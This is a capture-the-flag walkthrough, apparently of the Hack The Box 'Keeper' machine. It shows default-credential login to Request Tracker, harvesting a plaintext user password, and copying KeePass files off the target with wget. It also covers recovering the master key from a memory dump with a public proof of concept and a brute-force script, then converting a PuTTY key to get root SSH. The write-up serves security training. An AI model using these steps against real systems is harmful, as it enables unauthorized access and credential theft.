Running our nmap scan we have 2 open ports which are 22/SSH and 80/HTTP

Navigating to port 80/HTTP we can see that we advised to redirect to [tickets.keeper.htb/rt/](http://tickets.keeper.htb/rt/)



![](https://i.imgur.com/IERhxF8.png)



Go ahead and add both `tickets.keeper.htb` and `keeper.htb` to your `/etc/hosts` file



![](https://i.imgur.com/Q2hwLpq.png)



Clicking on the link you should be redirected to this page

After few enumeration i decided to search for the keyword "**RT 4.4.4 default credentials**" on google and came up with `root:password` creds


![](https://i.imgur.com/nFRjj5Z.png)



Trying this out on the web page gave us access, whoop :)


![](https://i.imgur.com/l9GOIau.png)



Navigating to `http://tickets.keeper.htb/rt/Admin/Users/` i found another user called "**lnorgaard**"


![](https://i.imgur.com/PsSOGX8.png)



Clicking the username of "**lnorgaard**", looks like we found the users password, `lnorgaard:Welcome2023!`



![](https://i.imgur.com/A9qoLjh.png)



Found out that this cred we got can login via SSH 


![](https://i.imgur.com/QEcaczU.png)


Running `ls` in our user home directory we have `.zip` file, you can go ahead and unzip it, in which gives us 2 other KeePass filess



![](https://i.imgur.com/rY07FyF.png)


Go ahead and transfer both files to our attacker's machine

```bash
# Target
python3 -m http.server 1337

# Attacker
wget 10.10.11.227:1337/passcodes.kdbx
wget 10.10.11.227:1337/KeePassDumpFull.dmp
```



![](https://i.imgur.com/LANCqPy.png)


After few attempts, trying to crack the `.kdbx` file and nothing comes up, i decided to copy the `KeePassDumpFull.dmp` file and paste on google which gave me this [link](https://github.com/matro7sh/keepass-dump-masterkey)


```bash
git clone https://github.com/matro7sh/keepass-dump-masterkey.git

cd keepass-dump-masterkey

python3 poc.py <PathToDmp>
```



Sometimes, the above might not work so use this simple `.sh` script, Note that > This script works very well in the case of a physical machine, for virtual machines it does not seem stable




```bash
#!/bin/sh
# Usage: ./keepass-pwn.sh Database.kdbx wordlist.txt (wordlist with 2 char)
while read i
do
    echo "Using password: \"$i\""
    echo "$i" | kpcli --kdb=$1 && exit 0
done < $2
```

Running the `poc.py` script create a listener then opening the `passcodes.kdbx` dump some gibberish text in the `poc.py` process, i then decided to copy few of the text and here is what google gave me -:

Copying this and pasting it, gives us access to the dashboard (all lowercase)

Unfortunately for us, the root password doesn't work ðŸ¤£, so let focus on the certificates given, go ahead and save this file into a file called `id_rsa.ppk`

```

Now split the public key away from the file with the following command


```bash
puttygen id_rsa.ppk -O public-openssh -o id_rsa.pub
```



![](https://i.imgur.com/shqpcRE.png)




Do this also for the private key


```bash
puttygen id_rsa.ppk -O private-openssh -o id_rsa
```



![](https://i.imgur.com/qkHx1Kt.png)



You should then be able to login as root

Incase i am a little bit too nerdy, well This [blog](https://www.baeldung.com/linux/ssh-key-types-convert-ppk) explains how you can split the private and public key better ðŸ¤“, Have fun
